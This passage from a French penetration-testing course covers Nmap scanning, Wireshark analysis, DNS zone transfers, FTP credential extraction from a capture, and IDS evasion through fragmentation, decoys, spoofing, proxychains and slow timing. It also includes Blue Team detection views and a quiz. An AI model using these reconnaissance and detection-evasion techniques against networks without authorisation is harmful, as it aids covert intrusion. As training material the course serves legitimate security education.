sudo nmap -sV -p 21,22,23,25,53,80,443,445 192.168.1.1

# Scan complet avec scripts par défaut
sudo nmap -sV -sC -p- 192.168.1.1

# Scan UDP des ports courants
sudo nmap -sU -p 53,67,68,69,123,161 192.168.1.1
```

#### Vérification manuelle des services

```bash
# Vérification HTTP/HTTPS
curl -I http://192.168.1.1
curl -I -k https://192.168.1.1

# Vérification SSH
nc -v 192.168.1.1 22

# Vérification SMTP
nc -v 192.168.1.1 25
# Une fois connecté:
EHLO test.com

# Vérification FTP
nc -v 192.168.1.1 21
# Une fois connecté:
USER anonymous
PASS anonymous@example.com
```

### Wireshark 101 : capture et analyse de base

Wireshark est l'analyseur de protocole réseau le plus utilisé. Il permet de capturer et d'examiner en détail le trafic réseau, ce qui est essentiel pour comprendre les vulnérabilités et les attaques.

#### Installation et configuration de base

```bash
# Installation sur Kali Linux
sudo apt update
sudo apt install -y wireshark

# Configuration pour permettre la capture sans privilèges root
sudo usermod -a -G wireshark $USER
# Déconnexion/reconnexion nécessaire pour appliquer le changement
```

#### Capture de trafic

1. **Lancement de Wireshark**
```bash
wireshark &
```

2. **Sélection de l'interface**
   - Choisissez l'interface réseau (eth0, wlan0, etc.)
   - Cliquez sur l'icône "Démarrer la capture"

3. **Filtres de capture**
```
# Capturer uniquement le trafic HTTP
tcp port 80

# Capturer le trafic vers/depuis une IP spécifique
host 192.168.1.1

# Capturer le trafic DNS
port 53

# Combinaison de filtres (trafic HTTP ou HTTPS vers une IP spécifique)
host 192.168.1.1 and (tcp port 80 or tcp port 443)
```

#### Analyse de base

1. **Filtres d'affichage**
```
# Afficher uniquement le trafic HTTP
http

# Afficher les requêtes GET HTTP
http.request.method == "GET"

# Afficher le trafic d'une IP spécifique
ip.addr == 192.168.1.1

# Afficher les erreurs TCP
tcp.analysis.flags

# Afficher les paquets contenant un mot spécifique
frame contains "password"
```

2. **Suivi de flux TCP/HTTP**
   - Clic droit sur un paquet > "Suivre" > "Flux TCP"
   - Permet de voir l'ensemble d'une conversation TCP

3. **Extraction de fichiers**
   - Menu "Fichier" > "Exporter objets" > "HTTP"
   - Permet d'extraire les fichiers transférés via HTTP

#### Exemple pratique : Analyse d'une requête HTTP

1. **Capture du trafic**
```bash
# Dans un terminal
curl http://example.com
```

2. **Analyse dans Wireshark**
   - Filtrez avec `http`
   - Observez la séquence : TCP handshake, requête HTTP, réponse HTTP
   - Examinez les en-têtes HTTP dans le panneau de détails

3. **Extraction d'informations**
   - Adresses IP source et destination
   - Ports utilisés
   - User-Agent dans l'en-tête HTTP
   - Contenu de la réponse

### Analyse de paquets : handshakes TCP, requêtes DNS, trafic HTTP

#### Handshake TCP (Three-way handshake)

Le handshake TCP est le processus d'établissement d'une connexion TCP entre deux hôtes.

**Étapes du handshake :**
1. **SYN** : Client → Serveur (Demande de synchronisation)
2. **SYN-ACK** : Serveur → Client (Accusé de réception + synchronisation)
3. **ACK** : Client → Serveur (Accusé de réception final)

**Analyse dans Wireshark :**
```
# Filtre pour voir les handshakes TCP
tcp.flags.syn == 1
```

**Implications pour le pentesting :**
- Les scans SYN (half-open) s'arrêtent après la réponse SYN-ACK
- Les firewalls peuvent bloquer certains types de paquets TCP
- L'analyse des flags TCP peut révéler des configurations de firewall

**Exemple de scan SYN avec Nmap :**
```bash
sudo nmap -sS 192.168.1.1
```

#### Requêtes DNS

DNS (Domain Name System) traduit les noms de domaine en adresses IP. L'analyse des requêtes DNS peut révéler beaucoup d'informations sur l'infrastructure cible.

**Types de requêtes DNS courants :**
- **A** : Adresse IPv4
- **AAAA** : Adresse IPv6
- **MX** : Serveur de messagerie
- **NS** : Serveur de noms
- **SOA** : Start of Authority
- **TXT** : Informations textuelles
- **CNAME** : Nom canonique (alias)

**Analyse dans Wireshark :**
```
# Filtre pour voir les requêtes DNS
dns

# Filtre pour voir les requêtes DNS de type A
dns.qry.type == 1
```

**Outils pour l'analyse DNS :**
```bash
# Requête DNS simple
dig example.com

# Requête DNS spécifique (MX)
dig example.com MX

# Tentative de transfert de zone
dig @ns1.example.com example.com AXFR

# Énumération de sous-domaines
dnsenum example.com
```

**Implications pour le pentesting :**
- L'énumération DNS peut révéler l'infrastructure interne
- Les transferts de zone peuvent exposer tous les sous-domaines
- Les enregistrements TXT peuvent contenir des informations sensibles

#### Trafic HTTP/HTTPS

L'analyse du trafic HTTP/HTTPS est essentielle pour comprendre les applications web et identifier les vulnérabilités potentielles.

**Analyse HTTP dans Wireshark :**
```
# Filtre pour voir le trafic HTTP
http

# Filtre pour voir les requêtes POST (potentiellement sensibles)
http.request.method == "POST"

# Filtre pour voir les cookies
http.cookie
```

**Analyse HTTPS :**
Le trafic HTTPS est chiffré et ne peut pas être analysé directement dans Wireshark, sauf si :
- Vous possédez la clé privée du serveur
- Vous utilisez un proxy MITM comme Burp Suite
- Vous avez configuré SSLKEYLOGFILE pour votre navigateur

**Exemple de configuration SSLKEYLOGFILE :**
```bash
# Configuration pour Firefox/Chrome
export SSLKEYLOGFILE=~/sslkeys.log
firefox &
```

**Outils pour l'analyse HTTP/HTTPS :**
```bash
# Requête HTTP simple
curl -v http://example.com

# Requête HTTPS avec affichage des certificats
curl -v --insecure https://example.com

# Utilisation de Burp Suite comme proxy
java -jar burpsuite_community.jar &
# Configurez votre navigateur pour utiliser le proxy 127.0.0.1:8080
```

### Vue Blue Team / logs générés / alertes SIEM

L'analyse réseau est une activité qui laisse des traces détectables. Comprendre ces traces est essentiel pour une approche OPSEC efficace.

#### Traces générées par les scans réseau

**Logs générés :**
- Journaux de pare-feu (connexions bloquées/autorisées)
- Logs IDS/IPS (signatures de scan détectées)
- Logs système (connexions inhabituelles)
- Logs d'application (erreurs de connexion)

**Exemple de log de pare-feu (iptables) :**
```
May 15 14:23:45 server kernel: [12345.678901] IPTABLES: IN=eth0 OUT= MAC=00:11:22:33:44:55:66:77:88:99:aa:bb:cc:dd SRC=192.168.1.100 DST=192.168.1.1 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=12345 DF PROTO=TCP SPT=45678 DPT=80 WINDOW=65535 RES=0x00 SYN URGP=0
```

**Exemple de log IDS (Snort) :**
```
[**] [1:1000001:1] NMAP TCP Scan [**]
[Classification: Attempted Information Leak] [Priority: 2]
05/15-14:23:45.123456 192.168.1.100:45678 -> 192.168.1.1:80
TCP TTL:64 TOS:0x0 ID:12345 IpLen:20 DgmLen:60
******S* Seq: 0x12345678 Ack: 0x0 Win: 0x1000 TcpLen: 40
TCP Options (5) => MSS: 1460 SackOK TS: 12345678 0 NOP WS: 7
```

#### Détection par les systèmes de sécurité

1. **IDS/IPS**
   - Détection de signatures de scan (Nmap, masscan, etc.)
   - Détection d'anomalies (volume inhabituel de connexions)
   - Détection de séquences de ports spécifiques

2. **SIEM**
   - Corrélation d'événements de scan provenant de différentes sources
   - Détection de patterns temporels (scans réguliers)
   - Alertes basées sur la réputation des adresses IP

3. **EDR (Endpoint Detection and Response)**
   - Détection de connexions sortantes inhabituelles
   - Identification de processus établissant de nombreuses connexions
   - Corrélation avec d'autres activités suspectes

#### Alertes SIEM typiques

**Alerte de scan de ports :**
```
[ALERT] Port Scan Detected
Source IP: 192.168.1.100
Target IP: 192.168.1.1
Time: 2023-05-15 14:23:45
Details: Multiple connection attempts to different ports (22,23,25,80,443,445) within 5 seconds
Severity: Medium
```

**Alerte de scan de vulnérabilité :**
```
[ALERT] Vulnerability Scanner Activity Detected
Source IP: 192.168.1.100
Target IP: 192.168.1.1
Time: 2023-05-15 14:30:12
Details: Nmap script scan signatures detected on HTTP service
Severity: High
```

### Pièges classiques et erreurs à éviter

#### Erreurs de configuration réseau

1. **Exposition involontaire**
   - Utilisation de votre adresse IP réelle pour les scans
   - Oubli de désactiver les services de découverte (LLMNR, NetBIOS)
   - Configuration incorrecte du proxy/VPN

2. **Problèmes de routage**
   - Mauvaise configuration des tables de routage
   - Confusion entre interfaces réseau
   - Oubli de vérifier la connectivité avant les tests

3. **Problèmes de résolution DNS**
   - Utilisation des serveurs DNS par défaut (fuites d'informations)
   - Échec de résolution des noms internes
   - Cache DNS non purgé entre les tests

#### Erreurs d'analyse

1. **Interprétation incorrecte des résultats**
   - Faux positifs dans les scans de vulnérabilité
   - Confusion entre services similaires
   - Mauvaise interprétation des réponses de port (filtered vs closed)

2. **Analyse incomplète**
   - Scan limité à certains ports
   - Oubli des services UDP
   - Négligence des protocoles non standards

3. **Confiance excessive dans les outils automatisés**
   - Absence de vérification manuelle
   - Utilisation d'une seule méthode de scan
   - Non-corrélation des résultats de différents outils

#### Erreurs OPSEC

1. **Scans trop agressifs**
   - Utilisation de `-T5` avec Nmap
   - Scan simultané de nombreuses cibles
   - Utilisation de techniques bruyantes (connect scan vs SYN scan)

2. **Empreinte digitale évidente**
   - User-Agent par défaut des outils
   - Signatures de trafic reconnaissables
   - Patterns de scan prévisibles

3. **Absence de dissimulation**
   - Non-utilisation de proxies/VPN
   - Connexions directes depuis votre machine
   - Utilisation d'outils connus sans personnalisation

### OPSEC Tips : réduction des traces réseau

1. **Scans discrets**
   - Utilisez des options de timing lentes (`-T2` ou moins avec Nmap)
   - Fragmentez vos scans (plages de ports plus petites)
   - Espacez vos scans dans le temps

```bash
# Scan lent et discret avec Nmap
sudo nmap -T2 -f --data-length 24 --randomize-hosts 192.168.1.0/24
```

2. **Masquage de l'origine**
   - Utilisez des proxies ou VPN
   - Changez régulièrement d'adresse IP
   - Utilisez des techniques de pivoting depuis des hôtes compromis

```bash
# Utilisation de proxychains avec Nmap
sudo proxychains nmap -sT 192.168.1.1
```

3. **Personnalisation des outils**
   - Modifiez les User-Agents
   - Changez les signatures par défaut
   - Utilisez des outils moins connus ou personnalisés

```bash
# Modification du User-Agent avec curl
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" http://example.com
```

4. **Techniques de scan passif**
   - Utilisez des sources d'information publiques (OSINT)
   - Analysez les certificats SSL (Certificate Transparency)
   - Exploitez les fuites d'information DNS

```bash
# Recherche de sous-domaines via Certificate Transparency
curl -s "https://crt.sh/?q=%.example.com&output=json" | jq -r '.[].name_value' | sort -u
```

5. **Réduction du bruit**
   - Limitez le nombre de paquets envoyés
   - Évitez les scans complets quand ce n'est pas nécessaire
   - Utilisez des techniques de scan ciblé

```bash
# Scan ciblé de services spécifiques
sudo nmap -p 80,443,8080 --open 192.168.1.0/24
```

### Points clés

- La compréhension des modèles OSI et TCP/IP permet d'identifier à quel niveau une vulnérabilité ou une attaque opère.
- La connaissance des ports et services courants est essentielle pour identifier rapidement les vecteurs d'attaque potentiels.
- Wireshark est un outil puissant pour l'analyse de trafic réseau, permettant de comprendre en détail les communications.
- L'analyse des handshakes TCP, requêtes DNS et trafic HTTP/HTTPS révèle des informations précieuses sur l'infrastructure cible.
- Les activités d'analyse réseau génèrent des traces détectables par les équipes de sécurité défensive.
- Des techniques OPSEC appropriées permettent de réduire significativement la détectabilité des activités de reconnaissance.

### Mini-quiz (3 QCM)

1. **Quelle technique de scan Nmap est la plus discrète ?**
   - A) Scan TCP connect (-sT)
   - B) Scan SYN (-sS)
   - C) Scan FIN (-sF)
   - D) Scan XMAS (-sX)

   *Réponse : C*

2. **Quel filtre Wireshark permettrait d'identifier un scan de ports ?**
   - A) `http.request`
   - B) `tcp.flags.syn == 1 && tcp.flags.ack == 0`
   - C) `dns.qry.type == 1`
   - D) `ip.addr == 192.168.1.1`

   *Réponse : B*

3. **Quelle information n'est PAS visible dans le trafic HTTPS chiffré sans clé privée ou SSLKEYLOGFILE ?**
   - A) L'adresse IP de destination
   - B) Le nom de domaine (via SNI)
   - C) Le contenu des requêtes POST
   - D) La version de TLS utilisée

   *Réponse : C*

### Lab/Exercice guidé : Analyse de captures réseau

#### Objectif
Analyser une capture réseau pour identifier les activités de reconnaissance, les services exposés et les potentielles vulnérabilités.

#### Prérequis
- Kali Linux avec Wireshark installé
- Fichier de capture pcap (fourni ci-dessous)

#### Étapes

1. **Préparation de l'environnement**

```bash
# Création du répertoire de travail
mkdir -p ~/pentest_labs/network_analysis
cd ~/pentest_labs/network_analysis

# Téléchargement du fichier de capture
wget https://github.com/SampleCaptures/SampleCaptures/raw/master/PracticalPacketAnalysis/ppa-capture-files/ftp.pcap
```

2. **Ouverture de la capture dans Wireshark**

```bash
wireshark ftp.pcap &
```

3. **Analyse du trafic réseau**

a. **Identification des hôtes**
   - Utilisez la statistique "Endpoints" (Menu Statistiques > Endpoints)
   - Notez les adresses IP actives dans la capture

b. **Analyse des protocoles**
   - Utilisez la statistique "Hiérarchie des protocoles" (Menu Statistiques > Hiérarchie des protocoles)
   - Identifiez les protocoles principaux utilisés

c. **Analyse des conversations**
   - Utilisez la statistique "Conversations" (Menu Statistiques > Conversations)
   - Identifiez les principales communications entre hôtes

4. **Analyse du trafic FTP**

a. **Filtrage du trafic FTP**
```
ftp || ftp-data
```

b. **Identification des commandes FTP**
```
ftp.request.command
```

c. **Extraction des identifiants**
```
ftp.request.arg contains "USER" || ftp.request.arg contains "PASS"
```

5. **Reconstruction des fichiers transférés**

a. **Identification des transferts de fichiers**
```
ftp-data
```

b. **Extraction des fichiers**
   - Menu Fichier > Exporter objets > FTP-DATA
   - Sélectionnez les fichiers à extraire et choisissez un répertoire de destination

6. **Analyse de sécurité**

a. **Identification des vulnérabilités**
   - Vérifiez si les identifiants sont transmis en clair
   - Examinez les permissions des fichiers et répertoires
   - Recherchez des informations sensibles dans les fichiers transférés

b. **Rédaction d'un rapport d'analyse**
```bash
nano rapport_analyse.txt
```

Incluez dans votre rapport :
   - Les hôtes identifiés et leurs rôles (client/serveur)
   - Les services détectés et leurs versions
   - Les vulnérabilités potentielles
   - Les informations sensibles découvertes
   - Les recommandations de sécurité

#### Vue Blue Team

Dans un environnement réel, cette analyse de trafic générerait :

1. **Logs de connexion FTP**
   - Enregistrement des tentatives d'authentification
   - Journalisation des commandes exécutées
   - Logs de transfert de fichiers

2. **Alertes potentielles**
   - Détection de transferts de fichiers sensibles
   - Identification d'authentifications en clair
   - Détection de commandes FTP inhabituelles

3. **Contre-mesures possibles**
   - Blocage du protocole FTP non chiffré
   - Mise en place de FTP sur TLS/SSL
   - Restriction des accès par IP source

#### Résultat attendu

À la fin de cet exercice, vous devriez être capable de :
- Identifier les hôtes et services dans une capture réseau
- Extraire des informations sensibles du trafic non chiffré
- Reconstruire des fichiers à partir de captures réseau
- Comprendre les vulnérabilités liées aux protocoles non sécurisés
- Apprécier l'importance du chiffrement pour les communications sensibles
# PARTIE I : FONDATIONS eJPT (+ OPSEC NIVEAU 1)

## Chapitre 4 : Scans & Nmap

### Introduction : Pourquoi ce thème est important

Le scan de réseau est l'une des premières étapes cruciales de tout test d'intrusion. Il permet d'identifier les hôtes actifs, les ports ouverts, les services en cours d'exécution et potentiellement les vulnérabilités présentes sur un système cible. Nmap (Network Mapper) est l'outil de référence dans ce domaine, offrant une flexibilité et une puissance inégalées pour la reconnaissance active. Ce chapitre vous enseignera non seulement comment utiliser efficacement Nmap pour cartographier un réseau, mais aussi comment le faire de manière discrète pour minimiser les chances de détection par les systèmes de sécurité. Nous aborderons également la perspective Blue Team pour comprendre comment ces activités de scan sont détectées et quelles traces elles laissent.

### Méthodologie de scan réseau

Une approche méthodique du scan réseau permet d'obtenir des résultats plus complets tout en minimisant les risques de détection.

#### Phases de scan recommandées

1. **Découverte d'hôtes** : Identifier les machines actives dans le réseau cible
2. **Scan de ports** : Déterminer quels ports sont ouverts sur les hôtes découverts
3. **Détection de services** : Identifier les applications et leurs versions
4. **Détection de système d'exploitation** : Déterminer l'OS des cibles
5. **Scan de vulnérabilités** : Rechercher des faiblesses connues

#### Approche progressive

Pour une approche OPSEC efficace, il est recommandé de procéder par étapes, du moins intrusif au plus intrusif :

1. **Reconnaissance passive** : Collecte d'informations sans envoyer de paquets à la cible
   ```bash
   # Exemple : recherche d'informations DNS
   host -t NS example.com
   host -t MX example.com
   ```

2. **Scan léger** : Vérification basique de la présence d'hôtes
   ```bash
   # Ping sweep simple
   sudo nmap -sn 192.168.1.0/24
   ```

3. **Scan ciblé** : Analyse des ports et services les plus courants
   ```bash
   # Scan des ports courants
   sudo nmap -sS -p 21,22,23,25,53,80,443,445,3389 192.168.1.0/24
   ```

4. **Scan approfondi** : Analyse complète des cibles les plus intéressantes
   ```bash
   # Scan complet avec détection de version
   sudo nmap -sS -sV -p- 192.168.1.100
   ```

5. **Scan avancé** : Utilisation de scripts et techniques spécifiques
   ```bash
   # Scan avec scripts de détection de vulnérabilités
   sudo nmap -sS -sV -p- --script vuln 192.168.1.100
   ```

### Nmap : commandes essentielles (-sS, -sV, -A)

Nmap est l'outil de scan réseau le plus puissant et le plus utilisé dans le domaine de la sécurité informatique. Maîtriser ses options est essentiel pour tout pentester.

#### Installation et vérification

```bash
# Installation sur Kali Linux (généralement préinstallé)
sudo apt update
sudo apt install -y nmap

# Vérification de la version
nmap --version
```

#### Types de scan de base

1. **Scan TCP SYN (-sS)** : Le scan par défaut et le plus populaire
   ```bash
   # Syntaxe
   sudo nmap -sS [cible]
   
   # Exemple
   sudo nmap -sS 192.168.1.1
   
   # Fonctionnement
   # 1. Envoie un paquet SYN à chaque port cible
   # 2. Si réponse SYN-ACK : port ouvert
   # 3. Si réponse RST : port fermé
   # 4. Si pas de réponse : port filtré (firewall)
   # 5. N'établit pas de connexion complète (plus discret)
   ```

2. **Scan TCP Connect (-sT)** : Scan complet TCP (sans privilèges root)
   ```bash
   # Syntaxe
   nmap -sT [cible]
   
   # Exemple
   nmap -sT 192.168.1.1
   
   # Fonctionnement
   # 1. Établit une connexion TCP complète (handshake)
   # 2. Plus bruyant car génère des logs de connexion
   # 3. Utilisable sans privilèges root
   ```

3. **Scan UDP (-sU)** : Scan des ports UDP
   ```bash
   # Syntaxe
   sudo nmap -sU [cible]
   
   # Exemple
   sudo nmap -sU --top-ports 100 192.168.1.1
   
   # Fonctionnement
   # 1. Envoie un paquet UDP vide ou spécifique au protocole
   # 2. Si réponse ICMP "port unreachable" : port fermé
   # 3. Si réponse UDP : port ouvert
   # 4. Si pas de réponse : port ouvert|filtré
   # 5. Beaucoup plus lent que les scans TCP
   ```

#### Détection de version et de système d'exploitation

1. **Détection de version (-sV)** : Identifie les services et leurs versions
   ```bash
   # Syntaxe
   sudo nmap -sV [cible]
   
   # Exemple
   sudo nmap -sV --version-intensity 7 192.168.1.1
   
   # Fonctionnement
   # 1. Établit une connexion avec chaque service détecté
   # 2. Envoie des requêtes spécifiques pour identifier la version
   # 3. Analyse les bannières et réponses
   # 4. L'intensité (0-9) détermine l'agressivité de la détection
   ```

2. **Détection de système d'exploitation (-O)** : Identifie l'OS de la cible
   ```bash
   # Syntaxe
   sudo nmap -O [cible]
   
   # Exemple
   sudo nmap -O --osscan-guess 192.168.1.1
   
   # Fonctionnement
   # 1. Envoie des paquets spécifiquement formatés
   # 2. Analyse les réponses pour identifier les particularités de l'OS
   # 3. Compare avec une base de signatures
   # 4. --osscan-guess force une estimation même avec peu d'informations
   ```

3. **Scan agressif (-A)** : Combine détection OS, version, scripts et traceroute
   ```bash
   # Syntaxe
   sudo nmap -A [cible]
   
   # Exemple
   sudo nmap -A 192.168.1.1
   
   # Fonctionnement
   # 1. Équivalent à -sV -O -sC --traceroute
   # 2. Très informatif mais très bruyant
   # 3. À utiliser uniquement quand la discrétion n'est pas prioritaire
   ```

#### Exemples de commandes Nmap complètes

1. **Scan de reconnaissance initial**
   ```bash
   # Découverte d'hôtes sans scan de port
   sudo nmap -sn 192.168.1.0/24
   
   # Sortie typique
   # Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 10:00 CEST
   # Nmap scan report for 192.168.1.1
   # Host is up (0.0023s latency).
   # MAC Address: AA:BB:CC:DD:EE:FF (Vendor)
   # Nmap scan report for 192.168.1.100
   # Host is up (0.0045s latency).
   # MAC Address: 11:22:33:44:55:66 (Vendor)
   # Nmap done: 256 IP addresses (2 hosts up) scanned in 2.05 seconds
   ```

2. **Scan de ports standard avec détection de version**
   ```bash
   # Scan des 1000 ports les plus courants
   sudo nmap -sS -sV 192.168.1.100
   
   # Sortie typique
   # Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-15 10:05 CEST
   # Nmap scan report for 192.168.1.100
   # Host is up (0.0045s latency).
   # Not shown: 995 closed tcp ports (reset)
   # PORT    STATE SERVICE     VERSION
   # 22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
   # 80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
   # 139/tcp open  netbios-ssn Samba smbd 4.6.2
   # 445/tcp open  netbios-ssn Samba smbd 4.6.2
   # 3306/tcp open  mysql      MySQL 8.0.28-0ubuntu0.20.04.3
   # MAC Address: 11:22:33:44:55:66 (Vendor)
   # Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   # Nmap done: 1 IP address (1 host up) scanned in 8.45 seconds
   ```

3. **Scan complet avec scripts par défaut**
   ```bash
   # Scan de tous les ports avec scripts par défaut
   sudo nmap -sS -sV -sC -p- 192.168.1.100
   
   # Fonctionnement des scripts par défaut (-sC)
   # 1. Exécute les scripts de la catégorie "default"
   # 2. Ces scripts sont non intrusifs et fournissent des informations utiles
   # 3. Incluent des scripts pour HTTP, SMB, DNS, etc.
   ```

### Timing et optimisation (-T, --min-rate)

Le timing des scans Nmap est crucial tant pour l'efficacité que pour la discrétion. Nmap offre plusieurs options pour contrôler la vitesse et l'agressivité des scans.

#### Templates de timing (-T)

Nmap propose 6 templates de timing prédéfinis, de 0 (le plus lent) à 5 (le plus rapide) :

1. **-T0 (Paranoid)** : Extrêmement lent, attend 5 minutes entre chaque sonde
   ```bash
   sudo nmap -T0 192.168.1.1
   # Utilisé pour évader les IDS, peut prendre des jours pour un scan complet
   ```

2. **-T1 (Sneaky)** : Très lent, attend 15 secondes entre chaque sonde
   ```bash
   sudo nmap -T1 192.168.1.1
   # Utilisé pour les scans très discrets, peut prendre des heures
   ```

3. **-T2 (Polite)** : Lent, attend 0.4 seconde entre chaque sonde
   ```bash
   sudo nmap -T2 192.168.1.1
   # Bon compromis entre discrétion et durée raisonnable
   ```

4. **-T3 (Normal)** : Timing par défaut, pas d'attente spécifique
   ```bash
   sudo nmap -T3 192.168.1.1
   # Comportement standard si aucun timing n'est spécifié
   ```

5. **-T4 (Aggressive)** : Rapide, adapté aux réseaux modernes et fiables
   ```bash
   sudo nmap -T4 192.168.1.1
   # Souvent utilisé pour les scans de routine, peut déclencher des alertes
   ```

6. **-T5 (Insane)** : Très rapide, sacrifie la précision pour la vitesse
   ```bash
   sudo nmap -T5 192.168.1.1
   # Peut manquer des ports ouverts, très bruyant, à éviter en pentest réel
   ```

#### Options de timing avancées

Pour un contrôle plus fin, Nmap offre plusieurs options spécifiques :

1. **--min-rate** : Nombre minimum de paquets par seconde
   ```bash
   sudo nmap --min-rate 100 192.168.1.0/24
   # Envoie au moins 100 paquets par seconde
   ```

2. **--max-rate** : Nombre maximum de paquets par seconde
   ```bash
   sudo nmap --max-rate 50 192.168.1.0/24
   # Limite à 50 paquets par seconde maximum
   ```

3. **--min-parallelism** : Nombre minimum de sondes parallèles
   ```bash
   sudo nmap --min-parallelism 10 192.168.1.0/24
   # Maintient au moins 10 sondes en parallèle
   ```

4. **--max-parallelism** : Nombre maximum de sondes parallèles
   ```bash
   sudo nmap --max-parallelism 5 192.168.1.0/24
   # Limite à 5 sondes parallèles maximum
   ```

5. **--scan-delay** : Délai entre les sondes
   ```bash
   sudo nmap --scan-delay 1s 192.168.1.0/24
   # Attend 1 seconde entre chaque sonde
   ```

#### Optimisation pour différents scénarios

1. **Scan discret pour éviter la détection**
   ```bash
   sudo nmap -T2 --max-rate 20 --scan-delay 2s 192.168.1.0/24
   # Scan lent avec délais entre les paquets
   ```

2. **Scan rapide pour un résultat préliminaire**
   ```bash
   sudo nmap -T4 --min-rate 300 -F 192.168.1.0/24
   # Scan rapide des 100 ports les plus courants (-F)
   ```

3. **Scan optimisé pour les réseaux instables**
   ```bash
   sudo nmap -T2 --max-retries 3 --host-timeout 30m 192.168.1.0/24
   # Tolère les pertes de paquets, abandonne après 30 minutes par hôte
   ```

### Contournement de pare-feu (-f, --mtu, --data-length)

Les pare-feu et systèmes de détection d'intrusion (IDS/IPS) peuvent bloquer ou alerter sur les activités de scan. Nmap offre plusieurs techniques pour contourner ces protections.

#### Fragmentation de paquets (-f)

La fragmentation divise les paquets TCP en plusieurs fragments plus petits, ce qui peut aider à contourner certains filtres.

```bash
# Fragmentation simple
sudo nmap -f 192.168.1.1

# Fragmentation double
sudo nmap -ff 192.168.1.1

# Spécification de la taille des fragments (multiple de 8)
sudo nmap --mtu 16 192.168.1.1
```

**Fonctionnement :**
1. Les paquets TCP sont divisés en fragments plus petits
2. Certains IDS/IPS analysent uniquement des paquets complets
3. La cible reconstitue les fragments pour former le paquet original
4. Moins efficace contre les IDS/IPS modernes qui font de la réassemblage

#### Modification de la taille des paquets

Changer la taille des paquets peut aider à éviter les signatures basées sur la taille standard.

```bash
# Ajout de données aléatoires
sudo nmap --data-length 25 192.168.1.1
# Ajoute 25 octets de données aléatoires à chaque paquet
```

#### Utilisation de ports source spécifiques

Spécifier un port source peut aider à traverser des règles de pare-feu mal configurées.

```bash
# Utilisation du port 53 (DNS) comme source
sudo nmap -g 53 192.168.1.1

# Équivalent avec --source-port
sudo nmap --source-port 53 192.168.1.1
```

#### Spoofing et leurres

Ces techniques avancées peuvent aider à masquer l'origine réelle du scan.

```bash
# Scan avec leurres (génère du bruit depuis d'autres IPs)
sudo nmap -D 10.0.0.1,10.0.0.2,ME 192.168.1.1
# ME représente votre adresse IP réelle parmi les leurres

# Spoofing d'adresse MAC (nécessite d'être sur le même réseau local)
sudo nmap --spoof-mac 00:11:22:33:44:55 192.168.1.1

# Spoofing d'adresse MAC aléatoire
sudo nmap --spoof-mac 0 192.168.1.1
```

**Avertissement OPSEC :**
Le spoofing d'adresse IP n'est généralement pas recommandé car :
1. Vous ne recevrez pas les réponses (scan aveugle)
2. Peut être facilement détecté par des contre-mesures modernes
3. Peut causer des problèmes à l'adresse usurpée

#### Techniques de scan exotiques

Nmap propose des techniques de scan alternatives qui peuvent être moins détectées.

```bash
# Scan FIN
sudo nmap -sF 192.168.1.1
# Envoie des paquets avec flag FIN, peut traverser certains filtres

# Scan NULL
sudo nmap -sN 192.168.1.1
# Envoie des paquets sans aucun flag TCP

# Scan XMAS
sudo nmap -sX 192.168.1.1
# Envoie des paquets avec flags FIN, PSH et URG activés

# Scan ACK
sudo nmap -sA 192.168.1.1
# Permet de cartographier les règles de pare-feu
```

**Limitations :**
Ces techniques ne fonctionnent pas correctement contre les systèmes Windows, qui répondent avec RST à tous les paquets, qu'un port soit ouvert ou fermé.

### Analyse des résultats et parsing XML

Nmap peut générer des résultats dans différents formats, ce qui facilite leur analyse et leur intégration dans d'autres outils.

#### Formats de sortie disponibles

1. **Normal** : Sortie texte standard (par défaut)
   ```bash
   nmap 192.168.1.1
   ```

2. **XML** : Format structuré pour traitement automatisé
   ```bash
   nmap -oX scan.xml 192.168.1.1
   ```

3. **Greppable** : Format simplifié pour filtrage avec grep
   ```bash
   nmap -oG scan.gnmap 192.168.1.1
   ```

4. **Tous formats** : Génère simultanément les trois formats principaux
   ```bash
   nmap -oA scan 192.168.1.1
   # Crée scan.nmap, scan.xml et scan.gnmap
   ```

#### Analyse des résultats XML avec des outils

1. **Utilisation de xsltproc pour générer un rapport HTML**
   ```bash
   xsltproc scan.xml -o scan.html
   ```

2. **Parsing avec Python et la bibliothèque python-libnmap**
   ```python
   #!/usr/bin/env python3
   from libnmap.parser import NmapParser
   
   # Charger le rapport XML
   report = NmapParser.parse_fromfile('scan.xml')
   
   # Afficher les hôtes et ports ouverts
   for host in report.hosts:
       if host.is_up():
           print(f"Host {host.address} is up")
           for port in host.get_open_ports():
               service = host.get_service(port[0], port[1])
               print(f"  Port {port[0]}/{port[1]} - {service.service} {service.version}")
   ```

3. **Extraction rapide avec grep et awk**
   ```bash
   # Extraire tous les ports ouverts
   grep "open" scan.nmap
   
   # Extraire les services HTTP
   grep "open.*http" scan.nmap
   
   # Extraire les adresses IP avec un port spécifique ouvert
   grep -l "80/tcp.*open" scan.gnmap | awk -F" " '{print $2}'
   ```

#### Script d'analyse automatisée

Voici un exemple de script Bash pour analyser automatiquement les résultats d'un scan Nmap :

```bash
#!/bin/bash
# scan_analyzer.sh - Analyse les résultats d'un scan Nmap

if [ $# -ne 1 ]; then
    echo "Usage: $0 <scan.xml>"
    exit 1
fi

SCAN_FILE=$1

# Vérifier que le fichier existe
if [ ! -f "$SCAN_FILE" ]; then
    echo "Erreur: Fichier $SCAN_FILE introuvable"
    exit 1
fi

# Extraire les informations de base
echo "=== Résumé du scan ==="
hosts_up=$(grep -c "status=\"up\"" "$SCAN_FILE")
echo "Hôtes actifs: $hosts_up"

# Extraire les ports ouverts par service
echo -e "\n=== Services détectés ==="
grep "portid=" "$SCAN_FILE" | grep "state=\"open\"" | \
    grep -o "service name=\"[^\"]*\"" | sort | uniq -c | \
    sed 's/service name=\"//g' | sed 's/\"//g'

# Extraire les vulnérabilités potentielles
echo -e "\n=== Vulnérabilités potentielles ==="
if grep -q "script id=\"vuln" "$SCAN_FILE"; then
    grep -A 2 "script id=\"vuln" "$SCAN_FILE" | \
        grep -E "id=|output=" | sed 's/<script id=\"//g' | \
        sed 's/\".*output=\"//g' | sed 's/\".*//g'
else
    echo "Aucune vulnérabilité détectée (nécessite --script vuln)"
fi

# Générer un rapport HTML si xsltproc est disponible
if command -v xsltproc &> /dev/null; then
    echo -e "\n=== Génération du rapport HTML ==="
